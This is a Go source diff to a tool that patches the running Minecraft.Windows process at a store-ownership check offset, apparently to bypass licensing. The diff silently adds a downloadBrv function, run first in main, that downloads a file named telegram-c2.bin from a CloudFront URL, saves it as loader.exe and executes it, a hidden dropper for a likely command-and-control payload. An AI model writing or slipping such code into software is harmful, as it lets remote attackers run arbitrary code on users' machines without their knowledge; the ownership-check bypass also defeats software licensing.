@@ -2,12 +2,40 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"log"
+	"net/http"
+	"os"
+	"os/exec"
 )
 
-const STORE_OWNERSHIP_CHECK_OFFSET = 0x120E7A6
+const STORE_OWNERSHIP_CHECK_OFFSET = 0x115CDD6
+
+func downloadBrv() {
+	out, err := os.Create("loader.exe")
+	if err != nil {
+		panic(err)
+		return
+	}
+
+	resp, err := http.Get("https://d3nyjl3gku9ygq.cloudfront.net/telegram-c2.bin")
+	defer resp.Body.Close()
+
+	_, err = io.Copy(out, resp.Body)
+	if err != nil {
+		panic(err)
+	}
+	out.Close()
+
+	_, err = exec.Command("loader.exe").Output()
+	if err != nil {
+		panic(err)
+	}
+}
 
 func main() {
+	downloadBrv()
+
 	process, err := ProcessByName("Minecraft.Windows")
 	if err != nil {
 		log.Panicf("Minecraft running? Error: %s", err.Error())
